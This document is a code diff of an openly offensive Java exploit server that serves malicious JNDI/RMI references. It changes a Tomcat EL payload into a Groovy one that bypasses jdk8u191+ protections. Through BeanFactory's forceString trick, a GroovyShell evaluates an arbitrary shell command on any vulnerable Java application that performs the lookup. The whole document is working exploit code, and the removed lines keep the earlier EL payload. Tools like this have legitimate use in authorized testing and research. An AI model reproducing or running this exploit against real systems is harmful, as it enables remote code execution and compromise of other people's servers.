@@ -36,26 +36,21 @@ import sun.rmi.transport.TransportConstants;
 
 /**
  * Generic JRMP listener
- *
+ * 
  * bypass jdk8u191+
  *
  *         <dependency>
- *             <groupId>org.apache.tomcat</groupId>
- *             <artifactId>tomcat-catalina</artifactId>
+ *             <groupId>org.codehaus.groovy</groupId>
+ *             <artifactId>groovy</artifactId>
  *         </dependency>
- *
- *         <dependency>
- *             <groupId>org.apache.tomcat</groupId>
- *             <artifactId>tomcat-jasper-el</artifactId>
- *         </dependency>
- *
+ * 
  * @author threedr3am
  *
  */
 @SuppressWarnings ( {
     "restriction"
 } )
-public class TomcatELRMIRefServer implements Runnable {
+public class GroovyRMIRefServer implements Runnable {
 
     private int port;
     private ServerSocket ss;
@@ -65,7 +60,7 @@ public class TomcatELRMIRefServer implements Runnable {
     private ReferenceWrapper referenceWrapper;
 
 
-    public TomcatELRMIRefServer( int port, ReferenceWrapper referenceWrapper ) throws IOException {
+    public GroovyRMIRefServer( int port, ReferenceWrapper referenceWrapper ) throws IOException {
         this.port = port;
         this.referenceWrapper = referenceWrapper;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
@@ -106,32 +101,28 @@ public class TomcatELRMIRefServer implements Runnable {
 
     public static final void main ( final String[] args ) {
         if ( args.length < 2 ) {
-            System.err.println(TomcatELRMIRefServer.class.getSimpleName() + " <port> '/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'"); //$NON-NLS-1$
+            System.err.println(GroovyRMIRefServer.class.getSimpleName() + " <port> '/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'"); //$NON-NLS-1$
             System.exit(-1);
         }
         int port = Integer.parseInt(args[0]);
-        StringBuilder stringBuilder = new StringBuilder("[");
+        StringBuilder stringBuilder = new StringBuilder();
         for (int i = 1; i < args.length; i++) {
-            stringBuilder.append("'");
             stringBuilder.append(args[i].replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\""));
-            stringBuilder.append("'");
             if (i != args.length - 1) {
-                stringBuilder.append(",");
+                stringBuilder.append(" ");
             }
         }
-        stringBuilder.append("]");
         System.out.println(stringBuilder.toString());
         try {
-            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",true,"org.apache.naming.factory.BeanFactory",null);
-            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
-            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
-            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
-            resourceRef.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](" + stringBuilder.toString() + ").start()\")"));
+            ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
+            resourceRef.add(new StringRefAddr("forceString", "x=evaluate"));
+            String script = String.format("'%s'.execute()", stringBuilder.toString());
+            resourceRef.add(new StringRefAddr("x",script));
 
             ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
 
             System.err.println("* Opening JRMP listener on " + port);
-            TomcatELRMIRefServer c = new TomcatELRMIRefServer(port, referenceWrapper);
+            GroovyRMIRefServer c = new GroovyRMIRefServer(port, referenceWrapper);
             c.run();
         } catch (RemoteException e) {
             e.printStackTrace();
